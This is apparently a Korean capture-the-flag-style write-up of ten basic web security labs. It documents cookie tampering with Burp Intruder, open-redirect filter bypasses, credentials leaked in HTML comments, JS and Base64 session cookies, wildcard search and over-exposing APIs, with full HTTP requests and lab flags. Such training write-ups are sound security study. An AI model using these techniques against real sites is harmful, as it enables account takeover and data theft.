---
title: "웹보안 및 모의해킹 Lab - Basic Web Vulnerabilities Writeup"
date: 2026-03-24T18:00:00+09:00
categories:
  - Web Hacking
tags:
  - Web Security Lab
  - Cookie Tampering
  - Open Redirect
  - Information Disclosure
  - Excessive Data Exposure
  - Session Exposure
last_modified_at: 2026-03-24T18:00:00+09:00
published: true
---
## 문제

대상: `http://192.168.0.21:8080/vuln/basic/`

범위: `LAB1 ~ LAB10`

## 개요

Burp Suite, 브라우저 소스 보기, 개발자도구, 응답 분석 결과를 기준으로 각 랩의 취약점 유형과 결과 정리

서버 소스코드 미확인 상태
실제 관찰한 요청/응답과 페이지 동작 중심 정리

## LAB1. Cookie Tampering

### 개요

쿠키 값으로 사용자 정보를 식별하는 구조에서 `lab1_userid` 값을 변조해 관리자 계정을 찾는 문제

### 풀이 과정

Burp에서 요청을 잡은 뒤 `lab1_userid` 값을 Intruder로 브루트포싱함

### 사용한 요청

```http
GET /vuln/basic/lab1.php HTTP/1.1
Host: 192.168.0.21:8080
Cache-Control: max-age=0
Accept-Language: ko-KR,ko;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.0.21:8080/vuln/basic/
Accept-Encoding: gzip, deflate, br
Cookie: lab1_userid=10200; PHPSESSID=29383e15cfd1d3277a168515182d5a78; user_session_data=eyJ1c2VyX2lkIjoyNSwidXNlcm5hbWUiOiJhZG1pbiIsInJvbGUiOiJ1c2VyIiwibG9naW5fYXQiOiIyMDI2LTAzLTI0IDAyOjA2OjQ2IiwiaW50ZXJuYWxfY29uZmlnIjp7ImRlYnVnX21vZGUiOnRydWUsImFkbWluIjp7InVzZXJuYW1lIjoiYWRtaW4iLCJwYXNzd29yZCI6IkxBQjEwLWFkbWluLXBhc3N3b3JkLTIwMjYhIn19fQ%3D%3D
Connection: keep-alive
```

### Intruder 설정

- `lab1_userid=10200` 의 `10200` 부분을 payload 위치로 지정
- Payload type: `Numbers`
- From: `10200`
- To: `10250`

### 결과

```text
31	10230	200	44	false	false	8374
32	10231	200	45	false	false	8374
33	10232	200	7	false	false	8374
34	10233	200	41	false	false	8368
35	10234	200	40	false	false	8374
36	10235	200	42	false	false	8374
37	10236	200	43	false	false	8374
```

응답 길이가 다른 `10233`이 눈에 띄었고, 해당 값을 확인하자 관리자 정보가 노출됨

### 확인한 응답 일부

```html
<div class="service-wrap">
    <div class="profile-card">
        <h2>👤 사용자 정보</h2>
        <p>현재 userid(10233)에 해당하는 계정 정보입니다.</p>
        <div class="profile-row">
            <span class="label">userid</span>
            <span class="value">10233</span>
        </div>
        <div class="profile-row">
            <span class="label">아이디</span>
            <span class="value">pirolab_admin</span>
        </div>
        <div class="profile-row">
            <span class="label">이름</span>
            <span class="value">시스템 관리자</span>
        </div>
        <div class="profile-row">
            <span class="label">권한</span>
            <span class="value role-admin">
                관리자            </span>
        </div>
    </div>
</div>
```

### 취약점 판단

사용자 식별용 쿠키 값을 클라이언트가 직접 조작할 수 있었고, 서버는 이를 신뢰해 다른 사용자 정보를 그대로 보여주는 구조

즉 Cookie Tampering을 통해 관리자 계정 확인 가능

### 플래그

```text
pirolab_admin
```

## LAB2. Open Redirect #1

### 개요

특정 파라미터를 조작하여 임의 페이지로 이동시키는 Open Redirect 문제

### 문제 코드

로그인 폼은 다음과 같이 `redirectUrl`을 hidden input으로 전달

```html
<form method="GET" action="">
    <input type="hidden" name="redirectUrl" value="/vuln/basic/info.php">
    <input type="text" name="username" value="admin">
    <input type="password" name="password">
</form>
```

즉 사용자가 보지 못하는 값처럼 보이지만, 실제로는 요청 파라미터로 그대로 전송되는 구조

### 사용한 URL

```bash
http://192.168.0.7:8080/vuln/basic/lab2.php?redirectUrl=/vuln/basic/success.php
```

### 관찰한 내용

- `redirectUrl` 값으로 이동 경로를 바꿀 수 있었음
- 사용자가 지정한 경로로 리다이렉트가 발생함

### 확인한 출력

```http
HTTP/1.1 302 Found
Location: /vuln/basic/success.php
```

브라우저는 위 응답을 받은 뒤 `success.php`로 바로 이동했고, 원래 이동 대상이던 `info.php`는 사용되지 않았음

### 취약점 판단

이동 위치가 요청 파라미터에 의해 제어되므로 Open Redirect 취약점으로 판단 가능

## LAB3. Open Redirect #2

### 개요

LAB2와 유사하지만, 파라미터가 변경된 상태에서 여전히 임의 페이지로 이동 가능한지 확인하는 문제

### 문제 코드

이번에는 `returnUrl`이 hidden input으로 비어 있는 상태에서 전달됨

```html
<form method="GET" action="">
    <input type="hidden" name="returnUrl" value="">
    <input type="text" name="username" value="admin">
    <input type="password" name="password">
</form>
```

화면에는 별도 이동 경로 선택 UI가 없지만, 요청 파라미터는 사용자가 직접 채울 수 있는 구조

### 사용한 URL

```bash
http://192.168.0.7:8080/vuln/basic/lab3.php?returnUrl=http://192.168.0.7:8080/vuln/basic/success2.php
```

### 관찰한 내용

- `returnUrl`에 절대 URL을 넣을 수 있었음
- 내부 경로가 아니라 전체 URL로도 이동이 가능했음

### 확인한 출력

```http
HTTP/1.1 302 Found
Location: http://192.168.0.7:8080/vuln/basic/success2.php
```

상대 경로가 아니라 절대 URL이 그대로 `Location`에 들어가므로, 리다이렉트 대상 검증이 없음을 확인 가능

### 취약점 판단

사용자가 지정한 절대 URL로 이동이 가능하므로 Open Redirect 취약점이 유지되고 있다고 볼 수 있음

## LAB4. Open Redirect #3

### 개요

기존 Open Redirect가 조치된 것처럼 보이지만, 다양한 표현 방식으로 우회가 가능한지 확인하는 문제

### 문제 코드

UI 상으로는 보안 적용 안내가 표시되지만, 여전히 `returnUrl` 입력 경로 자체는 남아 있다

```html
<div class="security-note">
    🔒 <strong>Open Redirect 취약점 보안 적용</strong>
</div>

<form method="GET" action="">
    <input type="hidden" name="returnUrl" value="">
    <input type="text" name="username" value="admin">
    <input type="password" name="password">
</form>
```

즉 프론트 안내 문구와 실제 서버 검증은 별개였고, 입력값 자체는 계속 제어 가능했음

### 사용한 URL

```bash
http://192.168.0.7:8080/vuln/basic/lab4.php?returnUrl=http:%2f%2f192.168.0.7:8080%2fvuln%2fbasic%2fsuccess3.php
```

### 확인한 우회 포인트

- URL 인코딩
- `/~~~~~`
- `//~~~`
- `http://~~`
- `Http://~~~`

### 관찰한 내용

- 단순 문자열 차단이 있더라도 URL 인코딩으로 우회가 가능했음
- 대소문자 변경, `//` 형태 등 다양한 표현 방식이 공격 포인트가 될 수 있음을 확인함

### 확인한 출력

```http
HTTP/1.1 302 Found
Location: http://192.168.0.7:8080/vuln/basic/success3.php
```

보안 적용 안내 문구가 있어도 최종 응답의 `Location`이 외부 입력을 그대로 반영하면 우회 가능 상태로 봐야 함

### 취약점 판단

입력값에 대한 필터링이 충분하지 않아 다양한 URL 표현으로 우회 가능한 Open Redirect 취약점

## LAB5. Hidden in Plain Sight

### 개요

페이지 소스에 숨겨진 정보를 찾아 관리자 계정을 확인하는 문제

### 확인 방법

브라우저에서 `Ctrl+U`로 페이지 소스를 확인함

### 확인한 코드

```html
<!-- 2026.01.02 수정자: 임개발
 관리자 계정은 배포 전에 제거해주세요. (administrator / admin_2026!) -->
```

### 관찰한 내용

- 화면에는 보이지 않는 HTML 주석에 관리자 계정 정보가 그대로 남아 있었음
- 주석만으로 계정 ID와 비밀번호 확인 가능

### 취약점 판단

클라이언트에 전달되는 HTML 주석에 민감한 정보가 포함되어 있어 정보노출 취약점이 발생함

### 획득 정보

- ID: `administrator`
- PW: `admin_2026!`

## LAB6. Exposed Admin Logic

### 개요

페이지에서 로드되는 JavaScript 안에 민감한 설정값이 노출된 문제

### 확인한 코드

```javascript
(function() {
    'use strict';
    var CONFIG = {
        ADMIN_ID: 'admin',
        ADMIN_PW: 'Lab5_Dev_Pass!',
        AUTH_TOKEN: 'ID5-exposed-token-7f3a9c',
        ADMIN_INFO_URL: '/vuln/basic/lab5_info.php'
    };
    window.LAB5_CONFIG = CONFIG;
})();
```

### 관찰한 내용

- 클라이언트 측 JS에서 `AUTH_TOKEN`이 그대로 노출됨
- 추가로 `ADMIN_ID`, `ADMIN_PW`, `ADMIN_INFO_URL`도 함께 노출되었음

### 취약점 판단

민감한 설정값과 인증 관련 데이터가 브라우저에서 직접 확인 가능하므로 정보노출 취약점

### 플래그

```text
ID5-exposed-token-7f3a9c
```

## LAB7. Wildcard Member Search

### 개요

정확 일치만 허용되는 것처럼 보이는 검색 기능에서 와일드카드 검색이 가능한 문제

### 문제 코드

검색 UI는 단건 조회처럼 보이지만, 실제로는 `q` 값을 그대로 백엔드 검색에 전달하는 구조

핵심: 화면보다 `?action=search&q=` 요청 형식 선확인

### 요청

```http
GET /vuln/basic/lab7.php?action=search&q=%* HTTP/1.1
Host: 192.168.0.21:8080
Accept-Language: ko-KR,ko;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: */*
Referer: http://192.168.0.21:8080/vuln/basic/lab7.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=29383e15cfd1d3277a168515182d5a78
Connection: keep-alive
```

### 응답

```http
HTTP/1.1 200 OK
Date: Tue, 24 Mar 2026 01:50:53 GMT
Server: Apache/2.4.54 (Debian)
X-Powered-By: PHP/7.4.33
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 653
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: application/json; charset=utf-8

{"members":[{"id":1,"member_no":"00000001","name":"김철수","email":"kim@example.com","department":"개발팀","internal_id":null},{"id":2,"member_no":"00000002","name":"이영희","email":"lee@example.com","department":"인사팀","internal_id":null},{"id":3,"member_no":"00000003","name":"박민수","email":"park@example.com","department":"영업팀","internal_id":null},{"id":4,"member_no":"00000005","name":"최지훈","email":"choi@example.com","department":"기획팀","internal_id":null},{"id":5,"member_no":"00000023","name":"김진수","email":"admin@pirolab.internal","department":"보안관리팀","internal_id":"LAB7-WILDCARD-ALL-2026"}]}
```

### 관찰한 내용

- `q=%` 요청만으로 전체 회원 목록이 조회되었음
- 관리자성 정보로 보이는 `admin@pirolab.internal` 계정과 내부 식별값 `internal_id`가 함께 노출되었음

### 취약점 판단

정확 일치 검색이어야 하는 기능에서 와일드카드 `%` 또는 `*` 가 동작해 전체 정보가 노출되므로 정보노출 취약점

### 플래그

```text
LAB7-WILDCARD-ALL-2026
```

## LAB8. Excessive Data Exposure #1

### 개요

아이디 중복체크 기능이 필요 이상으로 많은 정보를 반환하는 문제

### 문제 코드

중복 확인은 단순 존재 여부만 알려주면 충분한 기능이지만, 실제 API는 다음 형식으로 동작했음

```text
?action=check_username&username=admin
```

문제는 응답이 `available` 여부만이 아니라 사용자 객체와 운영 메타데이터까지 함께 반환했다는 점이었음

### 요청

```http
GET /vuln/basic/lab8.php?action=check_username&username=admin HTTP/1.1
Host: 192.168.0.21:8080
Accept-Language: ko-KR,ko;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: */*
Referer: http://192.168.0.21:8080/vuln/basic/lab8.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=29383e15cfd1d3277a168515182d5a78
Connection: keep-alive
```

### 응답

```http
HTTP/1.1 200 OK
Date: Tue, 24 Mar 2026 01:52:16 GMT
Server: Apache/2.4.54 (Debian)
X-Powered-By: PHP/7.4.33
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 301
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: application/json; charset=utf-8

{"available":false,"message":"이미 사용 중인 아이디입니다.","user":{"username":"admin","display_name":"admin","role":"user","registered_at":"2026-03-23 05:31:08"},"total_registered":39,"role_breakdown":{"user":38,"admin":1},"last_registered_at":"2026-03-24 01:31:13","api_version":"2.1.0"}
```

### 관찰한 내용

중복체크 요청 하나로 다음 정보가 노출됨

- `user.username`
- `user.display_name`
- `user.role`
- `user.registered_at`
- `total_registered`
- `role_breakdown`
- `last_registered_at`
- `api_version`

### 취약점 판단

중복 여부만 알려주면 되는 API가 사용자 정보와 운영 메타데이터까지 함께 반환하므로 Excessive Data Exposure 취약점

### 플래그

```text
39
```

## LAB9. Excessive Data Exposure #2

### 개요

아이디 중복체크 기능을 이용해 특정 관리자 계정 정보를 추가로 얻는 문제

### 문제 코드

LAB8과 동일한 중복체크 API를 그대로 사용하지만, 입력값만 관리자 계정명으로 바꿔 민감정보 노출 범위를 확인하는 문제

### 풀이 과정

관리자 계정을 브루트포싱하여 `administrator`를 얻은 뒤, 해당 계정명을 대상으로 요청을 보냄

### 요청

```http
GET /vuln/basic/lab9.php?action=check_username&username=administrator HTTP/1.1
Host: 192.168.0.21:8080
Accept-Language: ko-KR,ko;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: */*
Referer: http://192.168.0.21:8080/vuln/basic/lab9.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=29383e15cfd1d3277a168515182d5a78
Connection: keep-alive
```

### 응답

```http
HTTP/1.1 200 OK
Date: Tue, 24 Mar 2026 02:00:11 GMT
Server: Apache/2.4.54 (Debian)
X-Powered-By: PHP/7.4.33
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 273
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: application/json; charset=utf-8

{"available":false,"message":"이미 사용 중인 아이디입니다.","user":{"username":"administrator","display_name":"관리자(랩용)","role":"user","email":"administrator@seculab.internal","phone":"010-9999-0001","department":"보안관리팀","position":"팀장"}}
```

### 관찰한 내용

- 계정 존재 여부 외에 이메일, 전화번호, 부서, 직책까지 노출되었음
- 중복체크 기능이 개인정보 조회 API처럼 동작하고 있었음

### 취약점 판단

단순 확인용 API가 과도한 개인정보를 반환하므로 Excessive Data Exposure 취약점

### 플래그

```text
010-9999-0001
```

## LAB10. Hidden in Storage

### 개요

소스의 주석과 JS 파일, 비밀번호 찾기 기능, 세션 쿠키를 연계해 관리자 비밀번호를 획득하는 문제

### 문제 코드

페이지 소스의 주석과 `app_config.js`에는 비밀번호 찾기와 내부 세션 관련 힌트가 이미 드러난다

### 1. 페이지 소스에서 힌트 확인

페이지 소스를 확인하면 다음 주석이 보임

```html
<!-- 2026.03.20 수정자: 임개발 - 관리자 계정 노출 취약점 조치완료 (app_config.js 참고) -->
```

여기서 `app_config.js` 확인 힌트 확보 가능

### 2. app_config.js 확인

```javascript
/**
 * 앱 공통 설정 (Lab 9 로그인 페이지용)
 *
 * 2026.03.20 수정: 임개발 (imdelope0088)
 * - 비밀번호 찾기 API 연동 테스트용 엔드포인트 추가
 * - FIND_PW_ENDPOINT 연동 확인 완료
 * TODO: 배포 전 불필요한 API 정의 제거
 */
(function() {
    'use strict';
    var APP_APIS = {
        // 사용하지 않는 레거시 엔드포인트 (향후 제거 예정)
        LEGACY_HEALTH: '/api/v1/health',
        LEGACY_PING: '/api/v1/ping',
        LEGACY_VERSION: '/api/v1/version',
        // 비밀번호 찾기 연동 테스트용 (수정자: imdelope0088)
        FIND_PW_ENDPOINT: '/vuln/basic/lab10.php',
        SESSION_CHECK: '/api/internal/session'
    };
    window.APP_CONFIG = { APIS: APP_APIS };
})();
```

### 관찰한 내용

- 수정자 계정 `imdelope0088` 확인 가능
- `FIND_PW_ENDPOINT`가 `/vuln/basic/lab10.php`로 설정되어 있었음
- 즉 공개 화면에서는 보이지 않는 기능 경로와 내부 설정이 클라이언트 JS에 그대로 노출되어 있었음

### 3. 비밀번호 찾기 기능 악용

수정자 계정으로 비밀번호 찾기 요청을 전송함

### 요청

```http
POST /vuln/basic/lab10.php HTTP/1.1
Host: 192.168.0.21:8080
Content-Length: 256
Accept-Language: ko-KR,ko;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySBEs1WrJBr2kJjup
Accept: */*
Origin: http://192.168.0.21:8080
Referer: http://192.168.0.21:8080/vuln/basic/lab10.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=29383e15cfd1d3277a168515182d5a78
Connection: keep-alive

------WebKitFormBoundarySBEs1WrJBr2kJjup
Content-Disposition: form-data; name="action"

find_pw
------WebKitFormBoundarySBEs1WrJBr2kJjup
Content-Disposition: form-data; name="find_pw_input"

imdelope0088
------WebKitFormBoundarySBEs1WrJBr2kJjup--
```

### 응답

```http
HTTP/1.1 200 OK
Date: Tue, 24 Mar 2026 02:05:09 GMT
Server: Apache/2.4.54 (Debian)
X-Powered-By: PHP/7.4.33
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 164
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: application/json; charset=utf-8

{"success":true,"message":"휴대전화 본인인증을 진행해 주세요.","user":{"username":"imdelope0088","password":"devpass123","display_name":"임개발"}}
```

### 획득 정보

```text
id: imdelope0088
pw: devpass123
```

### 4. 개발자 계정으로 로그인

### 요청

```http
POST /vuln/basic/lab10.php HTTP/1.1
Host: 192.168.0.21:8080
Content-Length: 45
Cache-Control: max-age=0
Accept-Language: ko-KR,ko;q=0.9
Origin: http://192.168.0.21:8080
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.0.21:8080/vuln/basic/lab10.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=29383e15cfd1d3277a168515182d5a78
Connection: keep-alive

lab10_user=imdelope0088&lab10_pass=devpass123
```

로그인 후 페이지에서 다음 힌트를 확인함

```html
<div class="cookie-hint">
            💡 세션 정보로 무언가 할 수 있을 것 같습니다.
        </div>
```

### 5. 세션 정보 확인

### 요청

```http
GET /vuln/basic/lab10_info.php HTTP/1.1
Host: 192.168.0.21:8080
Cache-Control: max-age=0
Accept-Language: ko-KR,ko;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.0.21:8080/vuln/basic/lab10.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=29383e15cfd1d3277a168515182d5a78; user_session_data=eyJ1c2VyX2lkIjoyNSwidXNlcm5hbWUiOiJhZG1pbiIsInJvbGUiOiJ1c2VyIiwibG9naW5fYXQiOiIyMDI2LTAzLTI0IDAyOjA2OjQ2IiwiaW50ZXJuYWxfY29uZmlnIjp7ImRlYnVnX21vZGUiOnRydWUsImFkbWluIjp7InVzZXJuYW1lIjoiYWRtaW4iLCJwYXNzd29yZCI6IkxBQjEwLWFkbWluLXBhc3N3b3JkLTIwMjYhIn19fQ%3D%3D
Connection: keep-alive
```

쿠키에 포함된 `user_session_data` 값을 Base64 디코딩함

### 인코딩된 값

```text
eyJ1c2VyX2lkIjoyNSwidXNlcm5hbWUiOiJhZG1pbiIsInJvbGUiOiJ1c2VyIiwibG9naW5fYXQiOiIyMDI2LTAzLTI0IDAyOjA2OjQ2IiwiaW50ZXJuYWxfY29uZmlnIjp7ImRlYnVnX21vZGUiOnRydWUsImFkbWluIjp7InVzZXJuYW1lIjoiYWRtaW4iLCJwYXNzd29yZCI6IkxBQjEwLWFkbWluLXBhc3N3b3JkLTIwMjYhIn19fQ%3D%3D
```

### 디코딩 결과

```json
{"user_id":25,"username":"admin","role":"user","login_at":"2026-03-24 02:06:46","internal_config":{"debug_mode":true,"admin":{"username":"admin","password":"LAB10-admin-password-2026!"}}}
```

### 관찰한 내용

- 세션 쿠키에 Base64 형태의 데이터가 저장되어 있었음
- 이를 디코딩하자 `internal_config.admin.password` 값이 그대로 확인되었음

### 취약점 판단

클라이언트가 볼 수 있는 세션 데이터 안에 관리자 비밀번호와 내부 설정이 포함되어 있었으므로 심각한 정보노출 취약점

### 플래그

```text
LAB10-admin-password-2026!
```

## 정리

이번 Basic 랩의 주요 취약점 유형은 다음과 같음

- LAB1: 쿠키 변조를 통한 사용자 식별 우회
- LAB2 ~ LAB4: Open Redirect
- LAB5 ~ LAB6: HTML 주석 및 클라이언트 JS를 통한 정보노출
- LAB7 ~ LAB9: 과도한 데이터 노출 및 검색 기능 악용
- LAB10: 주석, JS 설정, 비밀번호 찾기, 세션 쿠키 노출이 연계된 정보노출

실습을 통해 확인한 공통점은 다음과 같음

- 클라이언트가 조작 가능한 값을 서버가 과도하게 신뢰함
- 화면에 보이지 않아도 소스나 JS 파일에 민감정보가 남아 있음
- 단순 확인용 API가 내부 데이터 조회 API처럼 동작함
- 인코딩된 값(Base64)을 보호 수단처럼 사용함

즉 사용자 입력 검증 미흡과 민감정보 관리 실패가 여러 형태로 반복됨을 확인 가능


